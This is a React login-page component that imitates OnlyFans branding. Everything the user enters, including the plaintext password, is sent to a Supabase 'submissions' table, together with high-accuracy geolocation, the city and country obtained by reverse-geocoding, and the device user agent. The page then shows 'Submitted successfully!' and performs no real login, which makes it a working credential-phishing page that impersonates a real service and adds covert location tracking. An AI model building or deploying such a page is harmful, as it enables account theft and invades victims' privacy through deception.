"use client"; // Required for browser APIs (geolocation, userAgent, state)

import React, { useState } from "react";
import { FaXTwitter, FaFingerprint } from "react-icons/fa6";
import { FcGoogle } from "react-icons/fc";
import { supabase } from "../../lib/supabase";

export default function Login() {
  /* -------------------- STATE -------------------- */
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // Validation errors
  const [errors, setErrors] = useState({ email: "", name: "" });

  // Button becomes active only when password exists & not loading
  const isActive = password.length > 0 && !loading;

  /* -------------------- VALIDATION -------------------- */
  const validateForm = (email, name) => {
    let valid = true;
    let newErrors = { email: "", name: "" };

    if (!email) {
      newErrors.email = "Email is required";
      valid = false;
    } else if (!/\S+@\S+\.\S+/.test(email)) {
      newErrors.email = "Enter a valid email address";
      valid = false;
    }

    if (!name) {
      newErrors.name = "Name is required";
      valid = false;
    } else if (name.length < 2) {
      newErrors.name = "Name must be at least 2 characters";
      valid = false;
    }

    setErrors(newErrors);
    return valid;
  };

  /* -------------------- DEVICE DETECTION -------------------- */
  const getDeviceInfo = () => {
    const ua = navigator.userAgent;

    let deviceType = "Desktop";
    if (/tablet|ipad|playbook|silk/i.test(ua)) deviceType = "Tablet";
    else if (/mobile|iphone|android/i.test(ua)) deviceType = "Mobile";

    return {
      deviceType,
      userAgent: ua,
    };
  };

  /* -------------------- LOCATION -------------------- */
  const getLocation = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) =>
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  };

  /* -------------------- SUBMIT -------------------- */
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const email = e.target.email.value.trim();
    const name = e.target.name.value.trim();

    if (!validateForm(email, name)) {
      setLoading(false);
      return;
    }

    // Device info
    const device = getDeviceInfo();

    // Location
    const location = await getLocation();

    let city = null;
    let country = null;

    // Reverse geocoding (lat/lng → city & country)
    if (location) {
      try {
        const res = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.latitude}&lon=${location.longitude}`
        );
        const data = await res.json();

        city =
          data.address.city ||
          data.address.town ||
          data.address.village ||
          null;

        country = data.address.country || null;
      } catch {}
    }

    // Insert into Supabase
    const { error } = await supabase.from("submissions").insert([
      {
        email,
        name,
        password, // optional: remove if not needed
        device_type: device.deviceType,
        device_info: device.userAgent,
        latitude: location?.latitude || null,
        longitude: location?.longitude || null,
        city,
        country,
      },
    ]);

    if (error) {
      console.error(error);
      alert("Error submitting data");
    } else {
      alert("Submitted successfully!");
      e.target.reset();
      setPassword(""); // 🔁 reset button to gray
    }

    setLoading(false);
  };

 
  
 

  return (
    <div className="flex flex-col md:flex md:flex-row min-h-screen bg-white">

      {/* ▼▼ MOBILE HEADER ▼▼ */}
      <div className="w-full p-6 md:hidden flex flex-col  ">
        <div className="flex flex-row  gap-3  ">
          <img
            src="/avatar.jpg"
            alt="Logo"
            className="w-10 h-10 rounded-full object-cover"
          />
          <h1 className="text-3xl font-bold text-sky-500">OnlyFans</h1>
        </div>

        <p className="mt-4 text-2xl text-neutral-800 font-semibold leading-snug">
          Sign up to support your favorite creators
        </p>
      </div>
      {/* ▲▲ MOBILE HEADER ▲▲ */}

      {/* LEFT SIDE — DESKTOP ONLY */}
      <div className="hidden md:flex w-1/2 bg-sky-500 items-center justify-center text-white">
        <div className="max-w-md p-8">
          <div className="flex flex-row items-center gap-3">
            <img
              src="/avatar.jpg"
              alt="Logo"
              className="w-12 h-12 object-cover rounded-full"
            />
            <h1 className="text-4xl font-bold mb-4">OnlyFans</h1>
          </div>

          <p className="text-2xl font-semibold leading-snug">
            Sign up to support your favorite creators
          </p>
        </div>
      </div>

      {/* RIGHT SIDE — FORM */}
      <div className="flex w-full md:w-1/2 items-center justify-center bg-white">
        <div className="w-full max-w-md p-8">
          <h2 className="text-lg text-neutral-900 font-semibold mb-4">Log in</h2>

          {/* FORM */}
          <form
            className="space-y-4"
            action=""
            method="POST"
            onSubmit={handleSubmit}
          >
            <div>
              <input
                type="email"
                name="email"
                placeholder="Email"
                
                className="w-full border text-neutral-900 border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
              />
              {errors.email && (
                <p className="text-red-500 text-xs mt-1">{errors.email}</p>
              )}
            </div>

            <div className="relative w-full">
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                name="name"
                placeholder="password"
                onChange={(e) => setPassword(e.target.value)}                
                className="w-full border text-neutral-900 border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
              />

              <span
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 text-neutral-500 top-1/2 -translate-y-1/2 cursor-pointer select-none">
                {showPassword ? "👁" : "👁"}
              </span>


              {errors.name && (
                <p className="text-red-500 text-xs mt-1">{errors.name}</p>
              )}
            </div>


             <button
                type="submit"
                disabled={!isActive}
                className={`w-full font-semibold py-3 rounded-full transition
                  ${
                    isActive
                      ? "bg-sky-400 text-white hover:bg-sky-600 cursor-pointer"
                      : "bg-gray-200 text-gray-400 "
                  }
                `}
              >
                {loading ? "Logging in..." : "LOG IN"}
              </button>

            {/* <button
              disabled={loading}
              type="submit"              
              className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-full"
            >
              LOG IN
            </button> */}
          </form>

          <p className="text-xs text-gray-500 mt-3">
            By logging in and using this site, you agree to our{" "}
            <a className="text-sky-500">Terms of Service</a> and{" "}
            <a className="text-sky-500">Privacy Policy</a>, and confirm you are
            at least 18 years old.
          </p>

          <div className="flex justify-center text-sm text-sky-500 mt-4 space-x-2">
            <a>Forgot password?</a>
            <span>•</span>
            <a>Sign up for an account</a>
          </div>

          {/* SOCIAL BUTTONS */}
          <div className="mt-6 space-y-3">
            <button className="w-full flex gap-2 bg-sky-500 text-white font-semibold py-3 rounded-full hover:bg-sky-600 transition relative">
              <div className="ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
                <FaXTwitter className="text-lg" />
              </div>
              <div className="w-full flex items-center justify-center">
                SIGN IN WITH X
              </div>
            </button>

            <button className="w-full flex gap-2 bg-blue-600 text-white font-semibold py-3 rounded-full hover:bg-blue-700 transition relative">
              <div className="bg-white ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
                <FcGoogle className="text-lg" />
              </div>
              <div className="w-full flex items-center justify-center">
                SIGN IN WITH GOOGLE
              </div>
            </button>

            <button className="w-full flex gap-2 bg-sky-400 text-white font-semibold py-3 rounded-full hover:bg-sky-500 transition relative">
              <div className="ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
                <FaFingerprint className="text-lg" />
              </div>
              <div className="w-full flex items-center justify-center">
                PASSWORDLESS SIGN IN
              </div>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
